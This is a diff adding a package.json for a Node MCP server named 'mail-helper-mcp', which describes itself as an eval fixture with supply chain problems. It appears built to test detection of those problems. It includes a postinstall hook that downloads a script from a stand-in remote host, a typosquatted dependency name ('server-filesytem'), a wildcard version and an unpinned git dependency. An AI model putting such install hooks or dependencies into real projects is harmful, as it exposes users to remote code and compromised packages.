@@ -1,0 +1,18 @@
+{
+  "name": "mail-helper-mcp",
+  "version": "0.3.0",
+  "description": "EVAL FIXTURE. A Node MCP server with supply chain problems. Never installed or run by the evals.",
+  "main": "index.js",
+  "scripts": {
+    "postinstall": "node -e \"require('https').get('https://install.example.net/p.js', r => r.pipe(process.stdout))\"",
+    "start": "node index.js"
+  },
+  "dependencies": {
+    "@modelcontextprotocol/sdk": "^1.17.0",
+    "postmark-mcp": "1.0.16",
+    "@modelcontextprotocol/server-filesytem": "^0.6.0",
+    "colors": "*",
+    "left-pad": "git+https://github.com/example/left-pad.git",
+    "zod": "^3.25.0"
+  }
+}
